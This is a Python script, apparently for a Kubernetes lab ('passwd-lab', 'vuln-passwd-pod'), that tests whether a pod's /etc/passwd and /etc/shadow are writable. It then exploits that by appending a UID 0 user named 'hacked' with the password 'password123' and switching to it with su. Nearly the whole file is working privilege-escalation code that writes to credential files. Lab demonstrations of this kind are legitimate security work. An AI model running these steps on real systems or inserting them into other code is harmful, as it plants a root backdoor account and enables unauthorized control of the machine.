#!/usr/bin/env python3
"""
External Privilege Escalation Test Script
This script runs from outside the container to test /etc/passwd exploitation
"""

import subprocess
import sys
import time

def check_pod_status(namespace, pod_name):
    """Check if the pod is running"""
    try:
        result = subprocess.run([
            'kubectl', 'get', 'pod', pod_name, 
            '-n', namespace, '-o', 'jsonpath={.status.phase}'
        ], capture_output=True, text=True, check=True)
        return result.stdout.strip() == 'Running'
    except subprocess.CalledProcessError:
        return False

def exec_command_in_pod(namespace, pod_name, command):
    """Execute a command inside the pod"""
    try:
        result = subprocess.run([
            'kubectl', 'exec', '-n', namespace, pod_name, '--', 'bash', '-c', command
        ], capture_output=True, text=True, check=True)
        return result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        return e.stdout, e.stderr

def test_file_permissions(namespace, pod_name):
    """Test file permissions inside the pod"""
    print("[*] Testing file permissions inside the pod...")
    
    # Check /etc/passwd permissions
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "ls -la /etc/passwd")
    print(f"[*] /etc/passwd permissions: {stdout.strip()}")
    
    # Check /etc/shadow permissions
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "ls -la /etc/shadow")
    print(f"[*] /etc/shadow permissions: {stdout.strip()}")
    
    # Check if files are writable
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "test -w /etc/passwd && echo 'Writable' || echo 'Not writable'")
    passwd_writable = 'Writable' in stdout
    
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "test -w /etc/shadow && echo 'Writable' || echo 'Not writable'")
    shadow_writable = 'Writable' in stdout
    
    return passwd_writable and shadow_writable

def exploit_privilege_escalation(namespace, pod_name):
    """Attempt privilege escalation by adding a fake user"""
    print("[*] Attempting privilege escalation...")
    
    # Generate password hash using Python inside the pod
    hash_command = '''
    python3 -c "
import crypt
password = 'password123'
hashed = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
print(hashed)
"
    '''
    
    stdout, stderr = exec_command_in_pod(namespace, pod_name, hash_command)
    if not stdout.strip():
        print("[-] Failed to generate password hash")
        return False
    
    password_hash = stdout.strip()
    print(f"[*] Generated password hash: {password_hash}")
    
    # Add fake user to /etc/passwd
    passwd_entry = f"hacked:x:0:0:root:/root:/bin/bash\n"
    add_passwd_cmd = f'echo "{passwd_entry}" >> /etc/passwd'
    
    stdout, stderr = exec_command_in_pod(namespace, pod_name, add_passwd_cmd)
    if stderr:
        print(f"[-] Error adding to /etc/passwd: {stderr}")
        return False
    
    # Add fake user to /etc/shadow
    shadow_entry = f"hacked:{password_hash}:19485:0:99999:7:::\n"
    add_shadow_cmd = f'echo "{shadow_entry}" >> /etc/shadow'
    
    stdout, stderr = exec_command_in_pod(namespace, pod_name, add_shadow_cmd)
    if stderr:
        print(f"[-] Error adding to /etc/shadow: {stderr}")
        return False
    
    print("[+] Successfully added fake user 'hacked' with UID 0")
    
    # Verify the user was added
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "grep hacked /etc/passwd")
    print(f"[*] Verification - /etc/passwd entry: {stdout.strip()}")
    
    # Try to switch to the hacked user
    print("[*] Attempting to switch to 'hacked' user...")
    stdout, stderr = exec_command_in_pod(namespace, pod_name, "su - hacked -c 'id'")
    print(f"[*] User ID as 'hacked': {stdout.strip()}")
    
    return True

def main():
    namespace = "passwd-lab"
    pod_name = "vuln-passwd-pod"
    
    print("🔓 Kubernetes /etc/passwd Privilege Escalation Test")
    print("=" * 60)
    
    # Check if pod is running
    if not check_pod_status(namespace, pod_name):
        print(f"[-] Pod {pod_name} is not running in namespace {namespace}")
        print("[*] Please ensure the pod is created and running")
        sys.exit(1)
    
    print(f"[+] Pod {pod_name} is running in namespace {namespace}")
    
    # Test file permissions
    if not test_file_permissions(namespace, pod_name):
        print("[-] Required files are not writable. Privilege escalation not possible.")
        sys.exit(1)
    
    print("[+] Files are writable. Proceeding with exploitation...")
    
    # Attempt privilege escalation
    if exploit_privilege_escalation(namespace, pod_name):
        print("\n🎯 PRIVILEGE ESCALATION SUCCESSFUL!")
        print("[*] The container is vulnerable to /etc/passwd exploitation")
        print("[*] A fake user 'hacked' with UID 0 has been created")
        print("[*] This demonstrates a critical security vulnerability")
    else:
        print("\n❌ Privilege escalation failed")
    
    print("\n[*] Test completed")

if __name__ == "__main__":
    main() 